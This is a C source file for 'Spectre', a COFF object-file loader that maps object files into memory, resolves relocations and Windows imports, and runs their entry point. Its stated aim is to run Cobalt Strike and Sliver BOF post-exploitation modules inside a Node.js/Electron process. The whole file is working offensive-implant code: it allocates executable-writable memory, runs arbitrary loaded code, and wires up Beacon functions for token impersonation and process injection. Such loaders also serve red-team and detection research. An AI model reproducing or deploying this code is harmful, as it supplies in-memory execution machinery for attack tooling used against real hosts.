/**
 * Spectre - COFF Object File Parser & Loader
 *
 * Manually maps COFF (.o) object files into memory, resolves
 * relocations and external symbols, then executes the entry point.
 * This enables running Cobalt Strike BOFs and Sliver armory BOFs
 * from within the Node.js/Electron process.
 *
 * Based on TrustedSec's COFFLoader concepts, reimplemented for
 * integration with Node-API.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../include/beacon.h"

// ============================================================
// COFF header structures
// ============================================================

#pragma pack(push, 1)

typedef struct {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} COFF_FILE_HEADER;

typedef struct {
    char     Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLineNumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLineNumbers;
    uint32_t Characteristics;
} COFF_SECTION_HEADER;

typedef struct {
    union {
        char ShortName[8];
        struct {
            uint32_t Zeros;
            uint32_t Offset;
        } LongName;
    } Name;
    uint32_t Value;
    int16_t  SectionNumber;
    uint16_t Type;
    uint8_t  StorageClass;
    uint8_t  NumberOfAuxSymbols;
} COFF_SYMBOL;

typedef struct {
    uint32_t VirtualAddress;
    uint32_t SymbolTableIndex;
    uint16_t Type;
} COFF_RELOCATION;

#pragma pack(pop)

// Machine types
#define IMAGE_FILE_MACHINE_AMD64  0x8664
#define IMAGE_FILE_MACHINE_I386   0x014C

// Section flags
#define IMAGE_SCN_MEM_EXECUTE     0x20000000
#define IMAGE_SCN_MEM_READ        0x40000000
#define IMAGE_SCN_MEM_WRITE       0x80000000
#define IMAGE_SCN_CNT_CODE        0x00000020
#define IMAGE_SCN_CNT_INITIALIZED_DATA   0x00000040
#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080

// Symbol storage classes
#define IMAGE_SYM_CLASS_EXTERNAL  2
#define IMAGE_SYM_CLASS_STATIC    3
#define IMAGE_SYM_CLASS_LABEL     6
#define IMAGE_SYM_CLASS_SECTION   104

// Relocation types (x64)
#define IMAGE_REL_AMD64_ADDR64    1
#define IMAGE_REL_AMD64_ADDR32NB  3
#define IMAGE_REL_AMD64_REL32     4
#define IMAGE_REL_AMD64_REL32_1   5
#define IMAGE_REL_AMD64_REL32_2   6
#define IMAGE_REL_AMD64_REL32_3   7
#define IMAGE_REL_AMD64_REL32_4   8
#define IMAGE_REL_AMD64_REL32_5   9

// ============================================================
// Internal function resolution table
// Maps BOF __imp_Beacon* and __imp_Win32 symbols to real addresses
// ============================================================

typedef struct {
    const char* name;
    void*       address;
} FunctionMapping;

static FunctionMapping g_beaconFunctions[] = {
    { "BeaconDataParse",               (void*)BeaconDataParse },
    { "BeaconDataShort",               (void*)BeaconDataShort },
    { "BeaconDataInt",                 (void*)BeaconDataInt },
    { "BeaconDataExtract",             (void*)BeaconDataExtract },
    { "BeaconDataLongArg",             (void*)BeaconDataLongArg },
    { "BeaconFormatAlloc",             (void*)BeaconFormatAlloc },
    { "BeaconFormatReset",             (void*)BeaconFormatReset },
    { "BeaconFormatFree",              (void*)BeaconFormatFree },
    { "BeaconFormatAppend",            (void*)BeaconFormatAppend },
    { "BeaconFormatPrintf",            (void*)BeaconFormatPrintf },
    { "BeaconFormatToString",          (void*)BeaconFormatToString },
    { "BeaconFormatInt",               (void*)BeaconFormatInt },
    { "BeaconPrintf",                  (void*)BeaconPrintf },
    { "BeaconOutput",                  (void*)BeaconOutput },
    { "BeaconUseToken",                (void*)BeaconUseToken },
    { "BeaconRevertToken",             (void*)BeaconRevertToken },
    { "BeaconIsAdmin",                 (void*)BeaconIsAdmin },
    { "BeaconGetSpawnTo",              (void*)BeaconGetSpawnTo },
    { "BeaconInjectTemporaryProcess",  (void*)BeaconInjectTemporaryProcess },
    { "BeaconSpawnTemporaryProcess",   (void*)BeaconSpawnTemporaryProcess },
    { "BeaconCleanupProcess",          (void*)BeaconCleanupProcess },
    { NULL, NULL }
};

// ============================================================
// Symbol resolution
// ============================================================

/**
 * Resolve an external symbol name to a function address.
 *
 * Handles three cases:
 *   1. __imp_Beacon* -> Beacon API functions (above table)
 *   2. __imp_MODULE$FunctionName -> LoadLibrary + GetProcAddress
 *   3. Beacon* (without __imp_) -> direct Beacon API
 */
static void* ResolveSymbol(const char* symbolName) {
    const char* cleanName = symbolName;

    // Strip leading underscore (x86 decoration)
    if (cleanName[0] == '_') {
        cleanName++;
    }

    // Strip __imp_ prefix
    BOOL isImport = FALSE;
    if (strncmp(cleanName, "__imp_", 6) == 0) {
        cleanName += 6;
        isImport = TRUE;
    } else if (strncmp(cleanName, "_imp_", 5) == 0) {
        cleanName += 5;
        isImport = TRUE;
    }

    // Check Beacon API functions
    for (int i = 0; g_beaconFunctions[i].name != NULL; i++) {
        if (strcmp(cleanName, g_beaconFunctions[i].name) == 0) {
            return g_beaconFunctions[i].address;
        }
    }

    // Check for MODULE$Function pattern (e.g., KERNEL32$CreateFileA)
    const char* dollar = strchr(cleanName, '$');
    if (dollar) {
        // Extract module name
        size_t moduleLen = dollar - cleanName;
        char moduleName[256];
        if (moduleLen >= sizeof(moduleName)) return NULL;

        strncpy(moduleName, cleanName, moduleLen);
        moduleName[moduleLen] = '\0';

        // Append .dll if not present
        if (!strstr(moduleName, ".dll") && !strstr(moduleName, ".DLL")) {
            strncat(moduleName, ".dll", sizeof(moduleName) - strlen(moduleName) - 1);
        }

        const char* funcName = dollar + 1;

        // Load module and resolve function
        HMODULE hMod = LoadLibraryA(moduleName);
        if (!hMod) {
            // Try lowercase
            for (size_t i = 0; i < strlen(moduleName); i++) {
                if (moduleName[i] >= 'A' && moduleName[i] <= 'Z') {
                    moduleName[i] += 32;
                }
            }
            hMod = LoadLibraryA(moduleName);
        }

        if (hMod) {
            FARPROC proc = GetProcAddress(hMod, funcName);
            if (proc) {
                return (void*)proc;
            }
        }
    }

    // Try as a direct Win32 API name in common modules
    const char* commonModules[] = {
        "kernel32.dll", "ntdll.dll", "user32.dll",
        "advapi32.dll", "ws2_32.dll", "ole32.dll",
        "oleaut32.dll", "msvcrt.dll", NULL
    };

    for (int i = 0; commonModules[i] != NULL; i++) {
        HMODULE hMod = GetModuleHandleA(commonModules[i]);
        if (!hMod) hMod = LoadLibraryA(commonModules[i]);
        if (hMod) {
            FARPROC proc = GetProcAddress(hMod, cleanName);
            if (proc) return (void*)proc;
        }
    }

    return NULL;
}

// ============================================================
// COFF Loader
// ============================================================

/**
 * Get a symbol's name from the COFF string table.
 */
static const char* GetSymbolName(
    COFF_SYMBOL* symbol,
    char* stringTable
) {
    static char shortName[9];

    if (symbol->Name.LongName.Zeros == 0) {
        // Long name - offset into string table
        return stringTable + symbol->Name.LongName.Offset;
    } else {
        // Short name (8 chars max, may not be null-terminated)
        memcpy(shortName, symbol->Name.ShortName, 8);
        shortName[8] = '\0';
        return shortName;
    }
}

/**
 * Load and execute a COFF object file.
 *
 * @param entryName   Name of the entry function (e.g., "go")
 * @param coffData    Raw COFF object file bytes
 * @param coffSize    Size of COFF data
 * @param argData     Argument data buffer for the BOF
 * @param argSize     Size of argument data
 * @return            0 on success, negative on error
 */
int RunCOFF(
    const char* entryName,
    uint8_t*    coffData,
    uint32_t    coffSize,
    uint8_t*    argData,
    uint32_t    argSize
) {
    if (!coffData || coffSize < sizeof(COFF_FILE_HEADER)) {
        return -1;
    }

    // Parse COFF header
    COFF_FILE_HEADER* fileHeader = (COFF_FILE_HEADER*)coffData;

    // Validate machine type
    if (fileHeader->Machine != IMAGE_FILE_MACHINE_AMD64 &&
        fileHeader->Machine != IMAGE_FILE_MACHINE_I386) {
        BeaconPrintf(CALLBACK_ERROR, "Unsupported COFF machine type: 0x%x",
                     fileHeader->Machine);
        return -2;
    }

    // Get section headers
    COFF_SECTION_HEADER* sections = (COFF_SECTION_HEADER*)(
        coffData + sizeof(COFF_FILE_HEADER) + fileHeader->SizeOfOptionalHeader
    );

    // Get symbol table and string table
    COFF_SYMBOL* symbolTable = (COFF_SYMBOL*)(
        coffData + fileHeader->PointerToSymbolTable
    );
    char* stringTable = (char*)(
        symbolTable + fileHeader->NumberOfSymbols
    );

    // Allocate memory for each section
    void** sectionData = (void**)calloc(fileHeader->NumberOfSections, sizeof(void*));
    if (!sectionData) return -3;

    for (int i = 0; i < fileHeader->NumberOfSections; i++) {
        COFF_SECTION_HEADER* sec = &sections[i];
        uint32_t size = sec->SizeOfRawData;
        if (size == 0) size = sec->VirtualSize;
        if (size == 0) {
            sectionData[i] = NULL;
            continue;
        }

        // Determine memory protection
        DWORD protect = PAGE_READWRITE;
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            protect = PAGE_EXECUTE_READWRITE;
        }

        sectionData[i] = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
        if (!sectionData[i]) {
            // Cleanup and fail
            for (int j = 0; j < i; j++) {
                if (sectionData[j]) VirtualFree(sectionData[j], 0, MEM_RELEASE);
            }
            free(sectionData);
            return -4;
        }

        // Copy section data
        if (sec->SizeOfRawData > 0) {
            memcpy(sectionData[i], coffData + sec->PointerToRawData, sec->SizeOfRawData);
        } else {
            memset(sectionData[i], 0, size);
        }
    }

    // Resolve external symbols
    void** symbolAddresses = (void**)calloc(fileHeader->NumberOfSymbols, sizeof(void*));
    if (!symbolAddresses) {
        for (int i = 0; i < fileHeader->NumberOfSections; i++) {
            if (sectionData[i]) VirtualFree(sectionData[i], 0, MEM_RELEASE);
        }
        free(sectionData);
        return -5;
    }

    for (uint32_t i = 0; i < fileHeader->NumberOfSymbols; i++) {
        COFF_SYMBOL* sym = &symbolTable[i];

        if (sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && sym->SectionNumber == 0) {
            // External symbol - needs resolution
            const char* name = GetSymbolName(sym, stringTable);
            void* resolved = ResolveSymbol(name);

            if (!resolved) {
                BeaconPrintf(CALLBACK_ERROR, "Unresolved symbol: %s", name);
            }

            symbolAddresses[i] = resolved;
        } else if (sym->SectionNumber > 0) {
            // Symbol defined in a section
            int secIdx = sym->SectionNumber - 1;
            if (secIdx < fileHeader->NumberOfSections && sectionData[secIdx]) {
                symbolAddresses[i] = (void*)((uint8_t*)sectionData[secIdx] + sym->Value);
            }
        }

        // Skip auxiliary symbols
        i += sym->NumberOfAuxSymbols;
    }

    // Process relocations
    for (int secIdx = 0; secIdx < fileHeader->NumberOfSections; secIdx++) {
        COFF_SECTION_HEADER* sec = &sections[secIdx];
        if (sec->NumberOfRelocations == 0 || !sectionData[secIdx]) continue;

        COFF_RELOCATION* relocs = (COFF_RELOCATION*)(
            coffData + sec->PointerToRelocations
        );

        for (int r = 0; r < sec->NumberOfRelocations; r++) {
            COFF_RELOCATION* rel = &relocs[r];
            uint8_t* target = (uint8_t*)sectionData[secIdx] + rel->VirtualAddress;
            void* symAddr = symbolAddresses[rel->SymbolTableIndex];

            if (!symAddr) {
                // For __imp_ symbols, we need the ADDRESS OF the function pointer
                COFF_SYMBOL* sym = &symbolTable[rel->SymbolTableIndex];
                const char* name = GetSymbolName(sym, stringTable);

                if (strstr(name, "__imp_") || strstr(name, "_imp_")) {
                    void* funcAddr = ResolveSymbol(name);
                    if (funcAddr) {
                        // Store function pointer and point to it
                        static void* impTable[1024];
                        static int impCount = 0;
                        if (impCount < 1024) {
                            impTable[impCount] = funcAddr;
                            symAddr = &impTable[impCount];
                            impCount++;
                        }
                    }
                }
            }

            if (!symAddr) continue;

            if (fileHeader->Machine == IMAGE_FILE_MACHINE_AMD64) {
                switch (rel->Type) {
                    case IMAGE_REL_AMD64_ADDR64:
                        *(uint64_t*)target = (uint64_t)(uintptr_t)symAddr;
                        break;
                    case IMAGE_REL_AMD64_ADDR32NB:
                        *(uint32_t*)target = (uint32_t)((uintptr_t)symAddr - (uintptr_t)target - 4);
                        break;
                    case IMAGE_REL_AMD64_REL32:
                        *(uint32_t*)target = (uint32_t)((uintptr_t)symAddr - (uintptr_t)target - 4);
                        break;
                    case IMAGE_REL_AMD64_REL32_1:
                        *(uint32_t*)target = (uint32_t)((uintptr_t)symAddr - (uintptr_t)target - 5);
                        break;
                    case IMAGE_REL_AMD64_REL32_2:
                        *(uint32_t*)target = (uint32_t)((uintptr_t)symAddr - (uintptr_t)target - 6);
                        break;
                    case IMAGE_REL_AMD64_REL32_3:
                        *(uint32_t*)target = (uint32_t)((uintptr_t)symAddr - (uintptr_t)target - 7);
                        break;
                    case IMAGE_REL_AMD64_REL32_4:
                        *(uint32_t*)target = (uint32_t)((uintptr_t)symAddr - (uintptr_t)target - 8);
                        break;
                    case IMAGE_REL_AMD64_REL32_5:
                        *(uint32_t*)target = (uint32_t)((uintptr_t)symAddr - (uintptr_t)target - 9);
                        break;
                }
            }
        }
    }

    // Find entry point
    void* entryPoint = NULL;
    for (uint32_t i = 0; i < fileHeader->NumberOfSymbols; i++) {
        COFF_SYMBOL* sym = &symbolTable[i];
        const char* name = GetSymbolName(sym, stringTable);

        // Strip leading underscore for comparison
        const char* cleanName = name;
        if (cleanName[0] == '_') cleanName++;

        if (strcmp(cleanName, entryName) == 0 && sym->SectionNumber > 0) {
            int secIdx = sym->SectionNumber - 1;
            if (secIdx < fileHeader->NumberOfSections && sectionData[secIdx]) {
                entryPoint = (void*)((uint8_t*)sectionData[secIdx] + sym->Value);
            }
            break;
        }

        i += sym->NumberOfAuxSymbols;
    }

    int result = 0;

    if (entryPoint) {
        // Initialize output capture
        BeaconOutputInit();

        // Execute the BOF entry point
        // BOF signature: void go(char* args, int alen)
        typedef void (*bof_entry_t)(char*, int);
        bof_entry_t entry = (bof_entry_t)entryPoint;

        __try {
            entry((char*)argData, (int)argSize);
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            BeaconPrintf(CALLBACK_ERROR, "BOF crashed with exception: 0x%08X",
                         GetExceptionCode());
            result = -6;
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Entry point '%s' not found in COFF", entryName);
        result = -7;
    }

    // Cleanup
    for (int i = 0; i < fileHeader->NumberOfSections; i++) {
        if (sectionData[i]) VirtualFree(sectionData[i], 0, MEM_RELEASE);
    }
    free(sectionData);
    free(symbolAddresses);

    return result;
}
